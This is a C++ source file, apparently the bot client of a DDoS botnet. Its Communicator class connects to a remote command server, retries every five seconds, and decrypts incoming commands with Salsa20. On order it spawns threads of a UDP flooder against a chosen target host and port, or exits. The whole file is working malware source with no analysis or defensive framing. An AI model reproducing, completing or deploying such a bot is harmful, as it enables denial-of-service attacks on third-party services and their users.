#include "handler.h"

Communicator::Communicator(LPSTR server_address, DWORD port, uint8_t key[32]) {
  if (WSAStartup(MAKEWORD(2, 2), &wsadata_) != 0) {
    exit(0);
  }
  hostent* address_info = gethostbyname(server_address);
  LPSTR server_ip = inet_ntoa(*(struct in_addr*)address_info->h_addr_list[0]);

  server_address_ = server_ip;
  port_ = port;

  for (int i = 0; i < 32; i++) {
    key_[i] = key[i];
  }
}

Communicator::~Communicator() {
  closesocket(socket_to_communicate_);
  WSACleanup();
}

DWORD Communicator::ConnectToServer() {
  SOCKADDR_IN server_address;

  socket_to_communicate_ = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (socket_to_communicate_ == INVALID_SOCKET) {
    return WSAGetLastError();
  }

  memset(&server_address, NULL, sizeof(server_address));
  server_address.sin_family = AF_INET;
  server_address.sin_port = htons(port_);
  inet_pton(AF_INET, server_address_, &server_address.sin_addr);

  if (connect(socket_to_communicate_, (SOCKADDR*)&server_address,
              sizeof(server_address)) == SOCKET_ERROR) {
    return WSAGetLastError();
  }
  return 0;
}

DWORD Communicator::ReceiveCommandFromServer(LPCOMMAND buffer) {
  DWORD status;
  status = recv(socket_to_communicate_, (char*)buffer, 4, 0);
  if (status == -1) {
    return 0;
  } else if (((char*)buffer)[0] == '\x00' && ((char*)buffer)[1] == '\x01' &&
             ((char*)buffer)[2] == '\x00' && ((char*)buffer)[3] == '\x01') {
    return 2;
  } else {
    status = recv(socket_to_communicate_, ((char*)buffer) + 4,
                  sizeof(Command) - 4, 0);
    if (status == -1) {
      return 0;
    } else {
      return 1;
    }
  }
}

DWORD Communicator::ParseCommand(LPCOMMAND command) {
  if (command->command_type == kUDP) {
    LPSTR target = command->param_string1;
    DWORD port = command->param_dword1;
    DWORD interval = command->param_dword2;
    DWORD duration = command->param_dword3;
    DWORD thread = command->param_dword4;

    Flooder* flooder = new Flooder(target, port, 10, duration);
    for (DWORD i = 0; i < thread; i++) {
      std::thread worker = flooder->WorkerThread();
      worker.detach();
    }
  } else if (command->command_type == kExit) {
    DWORD exitcode = command->param_dword1;

    exit(exitcode);
  }
  return 0;
}

DWORD Communicator::Handler() {
  while (ConnectToServer()) {
    Sleep(5000);
  }

  LPVOID command = malloc(sizeof(Command));
  while (TRUE) {
    DWORD status = ReceiveCommandFromServer((LPCOMMAND)command);
    if (status == 1) {
      Salsa20 decrypter(key_);
      decrypter.Salsa20Do((uint8_t*)command, sizeof(Command), 372);
      ParseCommand((LPCOMMAND)command);
    } else if (status == 0) {
      while (ConnectToServer()) {
        Sleep(5000);
      }
    }
  }
}